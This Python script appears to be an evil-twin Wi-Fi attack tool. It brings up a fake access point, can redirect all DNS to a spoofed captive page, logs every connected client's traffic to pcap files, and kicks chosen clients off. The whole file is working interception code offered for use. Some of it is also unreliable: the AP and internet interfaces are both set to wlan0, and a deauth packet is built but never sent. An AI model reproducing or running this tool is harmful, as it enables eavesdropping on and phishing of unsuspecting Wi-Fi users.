import os
import subprocess
import time
import signal
import sys
import threading
from scapy.all import *

# CONFIGURATION
INTERFACE = "wlan0"
INTERNET_IFACE = "wlan0" # Interface with internet (e.g., wlan0 or eth0)
LOG_DIR = "./logs"

def check_root():
    if os.geteuid() != 0:
        print("[-] This script requires root privileges. Run with sudo.")
        sys.exit(1)

def setup_network(ssid, password=None, internet=False):
    print(f"[+] Setting up AP: {ssid}")
    
    # 1. Clear previous configs
    subprocess.run(["killall", "hostapd", "dnsmasq"], stderr=subprocess.DEVNULL)
    subprocess.run(["ip", "addr", "flush", "dev", INTERFACE])
    
    # 2. Configure Hostapd (Wi-Fi)
    hostapd_conf = f"""
interface={INTERFACE}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
"""
    if password:
        # Standard WPA2
        hostapd_conf += f"""
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
    # Write config
    with open("/tmp/hostapd_custom.conf", "w") as f:
        f.write(hostapd_conf)

    # 3. Configure Dnsmasq (DHCP)
    dnsmasq_conf = f"""
interface={INTERFACE}
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,8.8.8.8
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.10.1
""" 
    # ^ The 'address=/#/...' line redirects ALL traffic to you (Captive Portal style)
    # Only use that line if you are NOT providing internet and want to spoof a page.
    
    if internet:
        # Remove the spoofing line if we want real internet
        dnsmasq_conf = dnsmasq_conf.replace("address=/#/192.168.10.1", "")
        
    with open("/tmp/dnsmasq_custom.conf", "w") as f:
        f.write(dnsmasq_conf)

    # 4. Set IP
    subprocess.run(["ip", "addr", "add", "192.168.10.1/24", "dev", INTERFACE])
    
    # 5. Handle Internet (NAT)
    if internet:
        print("[+] Enabling Internet Forwarding...")
        subprocess.run(["sysctl", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", INTERNET_IFACE, "-j", "MASQUERADE"])
        subprocess.run(["iptables", "-A", "FORWARD", "-i", INTERFACE, "-o", INTERNET_IFACE, "-j", "ACCEPT"])
        subprocess.run(["iptables", "-A", "FORWARD", "-m", "conntrack", "--ctstate", "RELATED,ESTABLISHED", "-j", "ACCEPT"])

    # 6. Start Processes
    print("[+] Starting Services...")
    subprocess.Popen(["dnsmasq", "-C", "/tmp/dnsmasq_custom.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    hostapd_proc = subprocess.Popen(["hostapd", "/tmp/hostapd_custom.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    return hostapd_proc

def start_logging(ssid):
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    filename = f"{LOG_DIR}/{ssid}_{timestamp}.pcap"
    print(f"[+] Logging traffic to {filename}")
    # Capturing in background
    cmd = ["tcpdump", "-i", INTERFACE, "-w", filename]
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def kick_user(target_mac):
    print(f"[!] Kicking user {target_mac}...")
    # Send Deauth packets (Scapy)
    # Note: This is aggressive. Be careful.
    pkt = RadioTap()/Dot11(addr1=target_mac, addr2="FF:FF:FF:FF:FF:FF", addr3="FF:FF:FF:FF:FF:FF")/Dot11Deauth()
    # Sending requires monitor mode usually, but hostapd_cli is safer for APs:
    subprocess.run(["hostapd_cli", "-i", INTERFACE, "deauthenticate", target_mac])
    print("[+] User deauthenticated.")

def cleanup():
    print("\n[-] Cleaning up...")
    subprocess.run(["killall", "hostapd", "dnsmasq", "tcpdump"], stderr=subprocess.DEVNULL)
    subprocess.run(["iptables", "-t", "nat", "-F"])
    subprocess.run(["iptables", "-F"])
    subprocess.run(["ip", "addr", "flush", "dev", INTERFACE])
    print("[+] Clean exit.")
    sys.exit(0)

# --- MAIN CLI LOOP ---
def main():
    check_root()
    
    print("--- FAKE AP SETUP ---")
    ssid = input("Enter SSID Name: ")
    sec_choice = input("Security? (1=Open, 2=WPA2): ")
    internet_choice = input("Provide Internet? (y/n): ").lower() == 'y'
    
    password = None
    if sec_choice == '2':
        password = input("Enter WPA2 Password: ")

    try:
        setup_network(ssid, password, internet_choice)
        log_proc = start_logging(ssid)
        
        print("\n[+] AP is RUNNING.")
        print("COMMANDS: 'kick <MAC>', 'ls' (list clients), 'exit'")
        
        while True:
            cmd = input("honey_fi > ").strip().split()
            if not cmd: continue
            
            if cmd[0] == 'exit':
                break
            elif cmd[0] == 'ls':
                # Quick hack to see connected clients via hostapd
                os.system(f"hostapd_cli -i {INTERFACE} all_sta")
            elif cmd[0] == 'kick' and len(cmd) > 1:
                kick_user(cmd[1])
            else:
                print("Unknown command.")
                
    except KeyboardInterrupt:
        pass
    finally:
        cleanup()

if __name__ == "__main__":
    main()
